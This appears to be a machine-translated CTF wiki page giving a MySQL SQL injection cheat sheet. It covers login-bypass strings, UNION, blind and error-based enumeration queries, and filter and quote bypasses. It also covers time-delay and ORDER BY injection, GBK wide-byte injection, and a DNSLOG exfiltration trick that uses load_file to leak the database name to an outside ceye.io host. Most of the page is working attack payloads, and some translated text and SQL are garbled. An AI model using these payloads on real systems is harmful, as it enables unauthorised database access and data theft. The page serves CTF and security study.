[EN](./sqli.md) | [ZH](./sqli-zh.md)
## basic concept


- SQL injection is an input parameter that inserts or adds SQL code to an application (user), and then passes these parameters to the backend SQL server for parsing and execution.
- An attacker can modify an SQL statement that has the same permissions as the component that executes the command, such as a database server, application server, or web server.
- SQL injection usually occurs if the WEB application developer cannot ensure that the value received from the WEB form, cookies, input parameters, etc. is passed to the SQL query (which is executed on the database server) before it is verified Vulnerabilities.


## Common tools


- Burp Suite: [Introduction to Burp Suite](http://drops.xmd5.com/static/drops/tools-1548.html)
-   Tamper Data (Firefox addon)

-   HackBar (Firefox addon)

- sqlmap: [sqlmap user manual](http://drops.xmd5.com/static/drops/tips-143.html)


## Injecting common parameters


- `user()`: current database user
- `database()`: current database name
- `version()`: the currently used database version
- `@@datadir`: database storage data path
- `concat()`: Union data used to combine two data results. Such as `concat(username,0x3a,password)`
- `group_concat()`: Similar to `concat()`, such as `group_concat(DISTINCT+user, 0x3a, password)`, used to inject multiple pieces of data at once
- `concat_ws()`: usage is similar
- `hex()` and `unhex()`: for hex encoding and decoding
- `load_file()`: Read the file as text. In Windows, the path is set to `\\`
- `select xxoo into outfile &#39;path&#39; `: can write files directly when the permission is high


## Grammar Reference and Tips


### Interline Notes


-   `--`



    ```sql

    DROP sampletable;--

    ```



-   `#`



    ```sql

    DROP sampletable;#

    ```



### Inline comment


- `/* comment content */`


    ```sql

DROP/*comment*/sampletable` DR/**/OP/* bypass filtering */sampletable` SELECT/* replace spaces */password/**/FROM/**/Members
    ```



- `/*! MYSQL exclusive*/`


    ```sql

    SELECT /*!32302 1/0, */ 1 FROM tablename

    ```



### string encoding


- `ASCII()`: return the ASCII value of the character
- `CHAR()`: converts an integer to the corresponding character


## Backstage universal password


-   `admin' --`

-   `admin' #`

-   `admin'/*`

-   `' or 1=1--`

-   `' or 1=1#`

-   `' or 1=1/*`

-   `') or '1'='1--`

-   `') or ('1'='1--`

- Log in as different users `&#39; UNION SELECT 1, &#39;anotheruser&#39;, &#39;doesnt matter&#39;, 1--`


## Injection statement memo


### data storage name


```sql

SELECT database();

SELECT schema_name FROM information_schema.schemata;

```



### Table Name


- union query


    ```sql

--version=9 for MySQL 4 and version=10 for MySQL 5
UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; /* Lists the tables in the current database*/
UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database(); /* Lists tables in all user-defined databases*/
    SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';

    ```



- blind


    ```sql

    AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'

    ```



- Error


    ```sql

    AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));

-- Successful in version 5.1.5.
    ```



### Column name


- union query


    ```sql

    UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'

    ```



- blind


    ```sql

    AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'

    ```



- Error


    ```sql

-- Successful in version 5.1.5
    AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)

-- MySQL 5.1 has been fixed
    AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));
    ```



- 利用 `PROCEDURE ANALYSIS ()`


    ```sql

-- This requires a web display page with a field for the query you injected
-- Get the first paragraph name
    SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE()

-- Get the second section name
1 LIMIT 1.1 PROCEDURE ANALYSIS ()
-- Get the third paragraph name
1 LIMIT 2.1 PROCEDURE ANALYSIS ()
    ```



### Query the table based on the column name


```sql

-- Query the table whose name is username
SELECT table_name FROM information_schema.columns WHERE column_name = 'username';

-- Query the table containing the username in the field name
SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';

```



### Bypassing quotes


```sql

-- hex encoding
SELECT * FROM Users WHERE username = 0x61646D696E

-- char() function
SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)

```



### Bypassing the string blacklist


```sql

SELECT 'a' 'd' 'mi' 'n';

SELECT CONCAT('a', 'd', 'm', 'i', 'n');

SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');

SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');

```



When `CONCAT()` is used, any argument is null and will return null. It is recommended to use `CONCAT_WS()`. The first argument of the `CONCAT_WS()` function indicates which character interval is used to query the result.


### Conditional statements


`CASE`, `IF()`, `IFNULL()`, `NULLIF()`.



```sql

SELECT IF(1=1, true, false);

SELECT CASE WHEN 1=1 THEN true ELSE false END;

```



### Delay function


`SLEEP()`, `BENCHMARK()`.



```sql

' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '

```



### order by post injection


`order by` Because it is a sort statement, you can use the conditional statement to make judgments, and judge the true and false conditions according to the returned sorting result. Variables with `order` or `order by` are probably the kind of injections. When you know a field, you can do the following:


Original link: `http://www.test.com/list.php?order=vote`


Sort according to the `vote` field. Find the ticket with the highest number of votes `num` and construct the following link:


```

http://www.test.com/list.php?order=abs(vote-(length(user())>0)*num)+asc

```



See if the sorting changes. There is another way to not know any field information, use the `rand` function:


```

http://www.test.com/list.php?order=rand(true)

http://www.test.com/list.php?order=rand(false)

```



The above two will return different sorts, and the statement that determines whether the first character in the table name is less than 128 is as follows:


```

http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))

```



### Wide byte injection


The most commonly used GBK code in the country, this way is mainly to bypass the transfer of special characters such as `addslashes`. The slash of backslash `\` is `%5c`. When you type `%bf%27`, the function encounters the single quotes and automatically transfers to `\`, which becomes `%bf%5c%. 27`,`%bf%5c`
In GBK it becomes a wide character &quot;缞&quot;. `%bf` The position can be any character in the middle of `%81-%fe`. Not only in SQL injection, wide character injection can be applied in many places.


### DNSLOG Injection


**DNS will leave a log when parsing, and obtain information by reading the parsing log of the multi-level domain name. Simply put, put the information in the advanced domain name, pass it to yourself, then read the log and get the information. **


Dnslog platform: [http://ceye.io/] (http://ceye.io/)


```

mysql> use security;

Database changed



mysql> select load_file('\\\\test.xxx.ceye.io\\abc');

+-------------------------------------------+

| load_file('\\\\test.xxx.ceye.io\\abc') |

+-------------------------------------------+

| NULL                                      |

+-------------------------------------------+

1 row in set (22.05 sec)



mysql> select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));

+----------------------------------------------------------------------+

| load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc')) |

+----------------------------------------------------------------------+

| NULL                                                                 |

+----------------------------------------------------------------------+

1 row in set (0.00 sec)

```

![](./php/figure/preg_match/sqli1.png)



## References


- [SQL Injection Cheat Sheet](http://drops.xmd5.com/static/drops/tips-7840.html)
- [MySQL Injection Tips](http://drops.xmd5.com/static/drops/tips-7299.html)
- [MySQL Injection Science](http://drops.xmd5.com/static/drops/tips-123.html)
- [MySQL Injection Summary](http://www.91ri.org/4073.html)
- [SQL Injection Attack and Defense](http://product.dangdang.com/23364650.html)